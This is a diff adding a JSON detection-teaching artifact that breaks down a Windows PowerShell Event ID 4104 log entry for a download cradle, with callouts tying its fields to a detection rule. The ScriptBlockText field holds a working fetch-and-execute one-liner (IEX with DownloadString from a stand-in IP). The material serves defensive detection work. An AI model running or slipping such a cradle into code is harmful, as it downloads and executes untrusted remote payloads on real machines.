@@ -1,0 +1,21 @@
+{
+  "title": "Event ID 4104 Script Block Log — Download Cradle Detected",
+  "event_type": "Microsoft-Windows-PowerShell/Operational channel, Event ID 4104 (Script Block Logging)",
+  "fields": [
+    {"label": "EventID", "value": "4104"},
+    {"label": "Channel", "value": "Microsoft-Windows-PowerShell/Operational"},
+    {"label": "ScriptBlockText", "value": "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.55/payload.ps1')"},
+    {"label": "ScriptBlockId", "value": "{4b1c2e7a-9f3d-4e21-8a6b-7c0d5e9f1a22}"},
+    {"label": "Path", "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},
+    {"label": "ComputerName", "value": "WIN10-TEST-01.contoso.local"},
+    {"label": "ProcessGuid", "value": "{5a8e19d0-3c44-11ee-9f2b-000c29a1b2c3}"},
+    {"label": "CorrelatedNetworkEvent", "value": "DNS query for 203.0.113.55 from same host/ProcessGuid, +42s after 4104 event"}
+  ],
+  "callouts": [
+    {"number": 1, "field_label": "ScriptBlockText", "explanation": "Contains both a fetch primitive (Net.WebClient/DownloadString) and an execution primitive (IEX) in the same script block, matching DET-10-02's composite condition rather than just the process name."},
+    {"number": 2, "field_label": "CorrelatedNetworkEvent", "explanation": "Confirms the script actually reached out to the referenced host within the 5-minute correlation window, distinguishing an executed download cradle from a comment or unused string."},
+    {"number": 3, "field_label": "ProcessGuid", "explanation": "Ties the script-block event to the host process lineage so the DNS/connection event can be joined to the exact PowerShell process that logged the 4104 entry, not merely the same host."},
+    {"number": 4, "field_label": "EventID", "explanation": "Identifies this as a Script Block Logging record (4104) rather than a process-creation event, which is the detection surface DET-10-02 moved to because it captures the code that ran, not just that powershell.exe launched."}
+  ],
+  "note": "This is an illustrative, conceptual field breakdown of what a matching Event ID 4104 entry and its correlated network event would contain; it is not a captured screenshot and depicts no product interface."
+}
